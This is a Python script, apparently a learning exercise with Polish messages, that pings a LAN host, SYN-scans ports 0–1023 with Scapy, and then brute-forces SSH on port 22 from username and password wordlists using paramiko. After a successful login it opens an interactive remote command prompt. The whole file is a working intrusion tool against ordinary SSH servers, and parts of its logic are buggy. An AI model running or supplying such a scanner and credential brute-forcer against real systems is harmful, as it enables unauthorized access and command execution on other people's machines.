from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko, time

target = '192.168.1.14'
registered_ports = range(0, 1024)
open_ports = []

def scanport(port):
    temp = RandShort()
    conf.verb = 0
    packet = IP(dst=target) / TCP(sport=temp, dport=port, flags='S')  # SYN -> SYN-ACK
    response = sr1(packet, timeout=0.5, verbose=0)
    if response is None:
        return False
    if response != response.getlayer(TCP):
        return False
    if response.getlayer(TCP).flags == 'SA':  # SA = 0x12
        print(f"Port {port} jest otwarty!")
    sr1(IP(dst=target) / TCP(sport=port, dport=port, flags='R'), timeout=3)
    return True


def check_availability():
    try:
        response = sr1(IP(dst=target) / ICMP(), timeout=3)
        if response:
            print(f"{target} is online")
            return True
    except:
        print("Host is unanavailable")


def bruteforce():

    targetIP = target
    targetPort = 22
    usersFile = open("UserFile.txt", "r")
    passwordsFile = open("PasswordList.txt", "r")

    users = usersFile.read().split("\n")
    passwords = passwordsFile.read().split("\n")

    isFind = False
    for user in users:
        for password in passwords:
            print(f"Próba: {user}:{password}")
            SSHconn = paramiko.SSHClient()
            SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy)
            SSHconn.load_system_host_keys()
            try:
                SSHconn.connect(targetIP, targetPort, user, password, timeout=1)
                print("[+] Zalogowano!")
                while True:
                    command = input("Podaj komendę: ")
                    if command == "exit":
                        break
                    stdin, stdout, stderr = SSHconn.exec_command(command)
                    time.sleep(1)
                    print(stdout.read().decode())
                isFind = True
                break

            except paramiko.ssh_exception.AuthenticationException:
                print("[-] Nieprawidłowe dane uwierzytelnienia")
            except:
                print("Błąd banneru")
                time.sleep(5)
                try:
                    SSHconn.connect(targetIP, targetPort, user, password, timeout=1)
                    print("[+] Zalogowano!")
                except paramiko.ssh_exception.AuthenticationException:
                    print("[-] Nieprawidłowe dane uwierzytelnienia")
                except:
                    print("Błąd banneru")
        if isFind:
            break

    SSHconn.close()

def main():
    check_availability()
    result = check_availability()
    if result == True:
        for port in registered_ports:
            is_open = scanport(port)
            print(f"Finished scanning port: {port}")
            if is_open:
                open_ports.append(port)
                print(f"Open ports: {open_ports}")

    if open_ports.__contains__(22):
        answer = input('Do you want brute force on port 22? (Y/N)')
        if answer == 'Y' or answer == 'y':
            bruteforce()

main()